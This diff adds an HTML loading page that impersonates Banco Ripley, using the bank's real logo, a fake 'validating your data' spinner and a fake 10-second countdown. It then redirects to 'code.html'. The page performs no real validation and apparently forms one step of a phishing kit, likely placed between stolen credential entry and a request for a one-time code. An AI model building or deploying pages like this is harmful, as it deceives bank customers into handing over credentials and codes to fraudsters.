@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Validando datos | Banco Ripley</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+      background: linear-gradient(180deg, #502b83 0%, #3a1f5f 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      overflow: hidden;
+    }
+
+    .loader-container {
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      padding: 30px 20px;
+      animation: fadeIn 1s ease;
+    }
+
+    .logo-box {
+      background: #fff;
+      display: inline-block;
+      padding: 16px 22px;
+      border-radius: 14px;
+      margin-bottom: 28px;
+      box-shadow: 0 8px 25px rgba(0,0,0,.2);
+    }
+
+    .logo-box img {
+      max-width: 220px;
+      width: 100%;
+    }
+
+    .title {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      letter-spacing: -0.3px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      font-weight: 300;
+      opacity: .95;
+      margin-bottom: 35px;
+    }
+
+    /* Spinner principal */
+    .spinner {
+      width: 90px;
+      height: 90px;
+      border-radius: 50%;
+      border: 6px solid rgba(255,255,255,.25);
+      border-top-color: #ffffff;
+      margin: 0 auto 30px;
+      animation: spin 1.1s linear infinite;
+    }
+
+    /* Barra de progreso */
+    .progress-box {
+      background: rgba(255,255,255,.25);
+      border-radius: 10px;
+      overflow: hidden;
+      height: 10px;
+      margin-top: 25px;
+    }
+
+    .progress {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #ffffff, #d7c6f5);
+      animation: load 10s linear forwards;
+    }
+
+    .time-text {
+      margin-top: 14px;
+      font-size: 14px;
+      opacity: .9;
+    }
+
+    /* Animaciones */
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes load {
+      from { width: 0%; }
+      to { width: 100%; }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Ondas decorativas */
+    .wave {
+      position: absolute;
+      bottom: -120px;
+      left: 0;
+      width: 200%;
+      height: 220px;
+      background: rgba(255,255,255,.08);
+      border-radius: 45%;
+      animation: wave 12s linear infinite;
+    }
+
+    .wave.wave2 {
+      bottom: -150px;
+      animation-duration: 18s;
+      opacity: .05;
+    }
+
+    @keyframes wave {
+      from { transform: translateX(0); }
+      to { transform: translateX(-50%); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="loader-container">
+    <div class="logo-box">
+      <img src="https://www.bancoripley.cl/media/logo-banco-ripley-DKG6FRYM.svg" alt="Banco Ripley">
+    </div>
+
+    <div class="title">Espere un momento</div>
+    <div class="subtitle">Estamos validando sus datos</div>
+
+    <div class="spinner"></div>
+
+    <div class="progress-box">
+      <div class="progress" id="progress"></div>
+    </div>
+
+    <div class="time-text" id="timeText">Validación en curso...</div>
+  </div>
+
+  <div class="wave"></div>
+  <div class="wave wave2"></div>
+
+  <script>
+    // Simulación de carga de 10 segundos
+    let seconds = 10;
+    const timeText = document.getElementById('timeText');
+
+    const interval = setInterval(() => {
+      seconds--;
+      if (seconds > 0) {
+        timeText.textContent = `Validación en curso... ${seconds}s`;
+      } else {
+        clearInterval(interval);
+        // Redirección automática al finalizar la carga
+        window.location.href = 'code.html';
+        // Aquí puedes redirigir
+        // window.location.href = 'dashboard.html';
+      }
+    }, 1000);
+  </script>
+
+</body>
+</html>
